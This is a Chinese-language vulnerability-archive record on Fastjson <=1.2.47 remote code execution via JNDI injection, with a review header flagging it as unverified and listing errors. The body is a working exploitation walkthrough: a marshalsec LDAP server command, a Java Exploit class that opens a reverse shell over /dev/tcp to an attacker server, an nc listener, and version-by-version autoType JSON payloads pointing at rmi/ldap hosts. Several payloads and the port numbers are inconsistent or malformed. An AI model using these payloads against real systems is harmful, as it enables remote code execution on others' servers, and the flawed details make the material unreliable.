---
source: "hatch 补库批 20260928"
product: "Fastjson<=1.2.47 cache/JNDI"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Fastjson <=1.2.47 远程代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Title<=1.2.47 vs body<1.2.47; several older version variants lackAutoType/dependency constraints"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8efc9960b33e360e8d3782c0"
entity_id: "ve-8efc9960b33e360e8d3782c0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Title&lt;=1.2.47 vs body&lt;1.2.47; several older version variants lackAutoType/dependency constraints

代码与实验材料：LDAP workflow/custom shell class; extra closing braces, RowSetImpl vs JdbcRowSetImpl, callback888 vs listener8888; missing image placeholders

来源证据范围：2ianxtianxt repos, no original advisory

- **代码与转录边界（1）**：Version endpoint contradiction and wrong class/port/payload syntax hinder reproduction。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（2）**：JDK1.8 generic requirement too broad;1.2.45 MyBatis dependency absent。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Fastjson \<=1.2.47 远程代码执行漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Fastjson \< 1.2.47

三、复现过程
------------

**https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1**

-   执行：

<!-- -->

    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IPvps/#Exploit

> **图片待核**：原归档在此处仅保留文件名 `1.png`，没有可对应的图片引用。

-   修改反弹ip和端口：

<!-- -->

    vim Exploit.java

-   编译生成class：//`需要使用jdk1.8，否则会报错`

<!-- -->

    javac Exploit.java

-   开启http服务：

<!-- -->

    python3 -m http.server 80 或者 python -m SimpleHTTPServer 80

-   payload:

<!-- -->

    {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1389/Exploit","autoCommit":true}}}

-   开启nc监听反弹：

<!-- -->

    nc -lvvp 8888

### 反弹shell poc补充

#### **java反弹shell，无法直接使用bash -i \>& /dev/tcp/攻击服务器ip/8888 0\>&1**

    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;

    public class Exploit{
        public Exploit() throws Exception {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/攻击服务器ip/888;cat <&5 | while read line; do $line 2>&5 >&5; done"});
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            String line;
            while((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            p.waitFor();
            is.close();
            reader.close();
            p.destroy();
        }

        public static void main(String[] args) throws Exception {
        }
    }

### 补充

**https://github.com/ianxtianxt/Fastjson-1.2.47-rce**

    1.2.24
    {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}

    未知版本(1.2.24-41之间)
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

    1.2.41
    {"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

    1.2.42
    {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};

    1.2.43
    {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}

    1.2.45
    {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}

    1.2.47
    {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
